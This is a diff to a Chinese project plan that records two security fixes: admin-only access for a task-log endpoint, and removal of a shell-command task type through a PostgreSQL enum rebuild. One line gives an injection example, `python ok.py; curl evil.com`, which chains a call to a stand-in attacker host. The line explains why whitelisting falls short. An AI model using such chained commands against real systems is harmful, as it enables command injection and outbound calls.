@@ -9,7 +9,7 @@ aliases:
   - AI代码清理实施计划
   - 代码瘦身计划
 parent: "[[AI代码清理与瘦身指南]]"
-status: 执行中（阶段3·第11轮 REP-001 安全面 P0 端点删除已落地，待第12轮）
+status: 执行中（阶段3·第12轮 BF-01 权限收口 + REP-003 C 档移除 LOCAL_COMMAND 已落地，待第13轮）
 ---
 
 # AI 代码清理与瘦身实施计划
@@ -789,6 +789,71 @@ C. 人工验收步骤：对照功能验收表，列出需要人工在界面上�
 
 - 提交 `46798ca`（父 `8fa9f39`，未 push；author `senior-dev`；仅上述 2 文件）。
 - **隔离**：`.codebase-memory/*`、`backend/uv.lock`、`docs/adr/*`、`docs/analysis-interface-*`、`docs/代码体检报告-*`、`web/vitest.config.ts.timestamp-*.mjs`（vitest 残留临时文件）等预存无关改动刻意排除，未入本轮提交。
+
+#### 第12轮-A · BF-01（任务执行日志越权）—— 权限收口
+
+**A. 漏洞与取证**
+
+`GET /api/admin/tasks/{id}/logs`（`admin/schedule.py:341`）原先是同模块 7 个端点中**唯一**漏网的：其余 6 个（handlers / list / create / patch / delete / trigger）均为 `Depends(require_admin)`，而它只挂 `Depends(get_current_user)` —— **任意登录用户**可读任意任务的执行日志。`JobRunLogOut.message/error`（`schedule.py:163-164`）承载任务完整 stdout/stderr，在 LOCAL_COMMAND 类型下即命令输出 → 越权信息泄露。
+
+附带发现：模块 docstring（`schedule.py:12`）宣称「全部依赖 require_admin」，与 :346 实际不符，属文档漂移。
+
+**B. 修复**
+
+`Depends(get_current_user)` → `Depends(require_admin)`（基于**数据库实时 role** 校验，`security.py:132-140`，不信任 JWT payload 的 role，被降权管理员持旧 JWT 无法绕过）；清理随之成为孤儿的 `get_current_user` import。
+
+提交 `4bb42bd`（父 `c8951cf`，未 push；`admin/schedule.py` + 新增测试文件，+96/−3）。
+
+**C. 回归护栏（原零覆盖）**
+
+新增 `backend/tests/test_admin_schedule_logs_auth.py`：普通用户 → 403 FORBIDDEN；管理员 → 200。
+
+> **踩坑（值得记录）**：首版测试用 `GET /api/admin/tasks` 取首个任务 id，**结果 2 skipped（护栏失效）**。实测测试库 `job_configs` **零行**（迁移虽写入过系统任务种子，但会话内为干净库），且该列表端点返回 `list[JobOut]`（`data` 直接是数组，**非**分页信封 `data.items`）。修正为「测试自建 `HTTP_CALLBACK` 任务」后才真正跑起来（2 passed）。刻意不用 LOCAL_COMMAND 建任务，使本护栏在其后被移除时仍成立。
+
+#### 第12轮-C · REP-003（LOCAL_COMMAND 彻底移除）—— owner 裁决 C 档
+
+**A. 裁决与范畴**
+
+REP-003 报告裁决为**采纳**，建议「环境开关 / 命令白名单 / BF-01 改 require_admin / 文档标注」四选一。经分析后向 owner 呈报：**白名单目录对 `shell=True` 防护力有限**（`cmd.exe /c` 下 `python ok.py; curl evil.com` 前半段过检、后半段照执行，除非改 `shell=False` + 参数数组，但那会破坏现有 `.bat`/`.ps1`/管道用法）。owner 裁决：**A（BF-01）立即做 + B 按 C 档执行（彻底移除）**。
+
+**B. 改动（提交 `4fa378b`，父 `4bb42bd`，未 push；7 文件 +93/−41）**
+
+| 层 | 文件 | 改动 |
+| --- | --- | --- |
+| 后端 | `core/scheduler.py` | 删 `_local_command` 处理器、`_HANDLERS` 注册、`_LOCAL_COMMAND_TIMEOUT`、孤儿 import `subprocess`（`asyncio` 仍被 :317/:417 使用，保留） |
+| 后端 | `models/enums.py` | 删 `JobTaskType.LOCAL_COMMAND` 成员 |
+| 后端 | `models/job.py` | 更新过时注释（原举例 `LOCAL_COMMAND.command`） |
+| 后端 | `modules/admin/schedule.py` | 删 `_HANDLER_META` 条目（前端不再能新建该类型） |
+| 前端 | `web/src/api/schedule.api.ts` | `JobTaskType` 联合类型删 `LOCAL_COMMAND` |
+| 前端 | `web/src/modules/admin/composables/use-schedule.ts` | 删 `TASK_TYPE_LABEL` 对应条目 |
+| 迁移 | `alembic/versions/t7u8v9w0x1y2_...py` | 新增（见下） |
+
+**C. ⚠️ 关键发现：PostgreSQL 不支持 `ALTER TYPE ... DROP VALUE`**
+
+`job_configs.task_type` 是 **PG 原生枚举**（`models/job.py:38-41`，`native_enum=True`），仅删 Python 端成员不会删 DB 枚举值。
+
+迁移初版用 `ALTER TYPE "JobTaskType" DROP VALUE IF EXISTS 'LOCAL_COMMAND'`，在 **PG 16.14 实测报 `syntax error at or near "VALUE"`**；逐一验证 `DROP VALUE` / `DROP VALUE IF EXISTS` / `DROP VALUE ... CASCADE` **三种写法全部语法错误**。
+→ **结论：PG 的 `ALTER TYPE` 对枚举仅支持 `ADD VALUE` 与 `RENAME VALUE`，从未提供 `DROP VALUE`。** 删除枚举值只剩两条路：① 直接删 `pg_enum` 系统表行（hack）；② **重建类型**（官方推荐，本迁移采用）。
+
+既有迁移 `s1a2b3c4d5e6_add_user_quote_sync_config.py:8` 的注释已印证此限制：「JobTaskType 枚举值保留，删除 PG 枚举值成本高且现有数据不依赖，不做」—— 即项目此前因成本高而回避；本轮因 owner 裁决 C 档，改用重建类型真正删除。
+
+**重建步骤（顺序不可颠倒，同事务内执行，PG 支持事务性 DDL 故可整体回滚）**：先删存量行 → 列降级 `text` → `DROP TYPE` → `CREATE TYPE`（5 值）→ 列改回枚举 `USING task_type::text::"JobTaskType"`。枚举名含大写，**必须加双引号**。
+
+**D. ⚠️ 破坏性（需 owner 知悉）**
+
+迁移会**永久删除**存量 `task_type='LOCAL_COMMAND'` 的任务及其 `job_run_logs`，**downgrade 无法恢复数据**（仅能加回枚举值）。必须先删行，否则列降级为 text 后转回新枚举时残留值无法 CAST 而失败。
+→ **上线前请确认生产/开发环境无需要保留的 LOCAL_COMMAND 任务。**
+
+**E. 验证**
+
+- `py_compile` 全过（含迁移文件）；`alembic upgrade head` 在**测试库**跑通，枚举剩 5 值、`alembic_version=t7u8v9w0x1y2`。
+- 源码零悬挂：历史迁移 `r6e5f4a3b2c1d:31` 的 `LOCAL_COMMAND` 提及**刻意保留**（改历史迁移会断链）。
+- 前端 `vue-tsc --noEmit -p tsconfig.app.json` **EXIT=0**。
+- 全量 `pytest tests` **291 passed / 0 failed**（289 基线 + 第12轮-A 新增 2 条）。
+
+**F. 新发现（本轮不修，记录备查）**
+
+前端 `JobTaskType`（`schedule.api.ts:18-23`）**缺 `LOG_CLEANUP`** —— 后端枚举有该值（`w3x4y5z6a7b8` 迁移加入），前端类型与 `TASK_TYPE_LABEL` 均未同步。属既有的前后端类型滞后，与 LOCAL_COMMAND 移除无关，按隔离纪律**未混入本轮**。
 
 ## 相关文档
 
